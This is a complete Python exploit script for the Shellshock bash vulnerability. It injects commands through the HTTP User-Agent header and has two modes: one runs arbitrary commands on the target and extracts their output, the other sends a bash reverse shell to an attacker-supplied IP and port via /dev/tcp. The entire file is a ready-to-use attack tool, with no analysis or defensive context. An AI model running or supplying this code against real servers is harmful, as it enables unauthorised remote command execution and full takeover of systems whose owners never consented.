#!/usr/bin/env python3

import requests
from sys import argv
from string import ascii_letters
from random import choice

def exploit(address, command):
	payload = '() { :;};' + command 
	headers = {'User-Agent':payload}

	response = requests.get(address, headers=headers)
	if response.ok:
		return True, response.text
	else:
		return False, response.status_code

def usage():
	print('Usage for commands:')
	print(f'\t{argv[0]} cmd <address> <command>\n')
	print('Usage for reverse shell:')
	print(f'\t{argv[0]} rev <local ip> <local port> <address>\n')
	quit()

def main():

	print('Shellshock Exploit Tool')

	if len(argv) < 2:
		usage()

	if argv[1] == 'rev' and len(argv) == 5:
		print(f'Sending reverse shell payload using:\n\tLocal IP: {argv[2]} and port: {argv[3]}')
		revshell= f'/bin/bash -i >& /dev/tcp/{argv[2]}/{argv[3]} 0>&1'
		exploit(argv[4], revshell)
	elif argv[1] == 'cmd' and len(argv) > 3:
		start = ''.join(choice(ascii_letters) for i in range(10))
		end = ''.join(choice(ascii_letters) for i in range(10))
		cmd = ' '.join(argv[3:])
		command = 'echo -e "\\r\\n' + start + '$(' + cmd + ')' + end + '"'
		print(f'Sending command: {cmd}\n')
		success, response = exploit(argv[2], command)
		if success:
			print(f'[+] {response.split(start)[1].split(end)[0]}\n')
		else:
			print(f'[-] Error Code: {response}\n')

	else:
		usage()

	
main()
